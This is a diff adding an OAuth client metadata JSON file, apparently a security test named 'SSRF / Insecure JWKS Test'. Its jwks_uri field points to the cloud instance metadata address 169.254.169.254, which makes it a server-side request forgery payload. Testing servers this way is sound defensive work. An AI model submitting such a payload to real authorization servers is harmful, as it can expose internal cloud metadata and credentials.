@@ -1,0 +1,15 @@
+{
+  "client_id": "https://ashish0607.github.io/cimd-test-jwk-agent-app/mcpmetadatassrf.json",
+  "client_name": "SSRF / Insecure JWKS Test",
+  "redirect_uris": [
+    "https://ashish0607.github.io/cimd-test-jwk-agent-app/callback"
+  ],
+  "grant_types": [
+    "authorization_code"
+  ],
+  "response_types": [
+    "code"
+  ],
+  "token_endpoint_auth_method": "private_key_jwt",
+  "jwks_uri": "http://169.254.169.254/latest/meta-data/"
+}
